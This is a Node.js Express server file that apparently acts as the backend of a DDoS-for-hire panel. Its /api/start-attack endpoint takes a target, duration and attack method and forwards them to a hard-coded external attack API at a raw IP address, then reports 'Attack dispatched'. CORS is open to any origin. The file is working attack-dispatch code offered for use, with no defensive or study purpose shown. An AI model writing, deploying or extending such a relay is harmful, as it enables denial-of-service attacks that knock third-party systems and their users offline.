const express = require("express");
const axios = require("axios");
const app = express();
const PORT = process.env.PORT || 8082;

app.use(express.json()); // ?? PENTING
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  next();
});

const attackAPIs = [
  "http://128.199.219.185:5032/syafrial"
];

app.post("/api/start-attack", async (req, res) => {
  if (!req.body) {
    return res.status(400).json({ success: false, message: "Missing JSON body" });
  }

  const { target, duration, method, username } = req.body;

  if (!target || !duration || !method) {
    return res.status(400).json({ success: false, message: "Missing parameters" });
  }

  const results = [];

  for (const api of attackAPIs) {
    try {
      const params = { target, time: duration, methods: method };
      const response = await axios.get(api, { params });
      results.push({ api, response: response.data });
    } catch (err) {
      results.push({ api, error: err.message });
    }
  }

  res.json({ success: true, message: "Attack dispatched", results });
});

app.listen(PORT, () => {
  console.log(`?? API listening on port ${PORT}`);
});
